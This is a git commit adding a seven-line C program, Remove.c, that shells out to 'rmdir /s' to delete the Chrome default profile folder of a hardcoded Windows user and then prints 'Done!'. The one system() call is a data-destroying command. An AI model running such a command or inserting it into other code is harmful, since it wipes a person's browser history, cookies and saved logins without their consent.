45bbdf0c1edf9c7745f75d2e119f948529f64fe7
Adam Salem <84548368+ItzVoidYT@users.noreply.github.com>
2022-06-10 18:33:44 -0400

    Add files via upload

---
+++ Code/Remove.c
@@ -0,0 +1,7 @@
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(void) {
+    system("rmdir /s \"C:\\Users\\John Doe\\AppData\\Local\\Google\\Chrome\\User Data\\Default\" ");
+    printf("Done!");
+}
